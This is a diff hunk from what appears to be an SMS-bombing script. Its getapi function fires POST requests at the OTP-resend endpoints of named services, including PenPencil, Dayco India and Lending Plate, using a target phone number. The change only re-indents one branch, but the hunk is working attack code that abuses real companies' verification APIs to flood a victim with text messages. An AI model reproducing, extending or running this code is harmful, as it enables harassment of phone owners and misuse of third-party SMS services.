@@ -157,7 +157,7 @@ def getapi(pn, index, cc):
         elif index == 60: # PenPencil v2
             return session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=1", json={"organizationId": "5eb393ee95fab7468a79d189", "mobile": pn}, timeout=5).status_code == 200
             
-                    elif index == 61: # Dayco India
+        elif index == 61: # Dayco India
             return session.post("https://ekyc.daycoindia.com/api/nscript_functions.php", data=f"api=send_otp&brand=dayco&mob={pn}&resend_otp=resend_otp", timeout=5).status_code == 200
         elif index == 62: # Lending Plate
             return session.post("https://lendingplate.com/api.php", data=f"mobiles={pn}&resend=Resend", timeout=5).status_code == 200
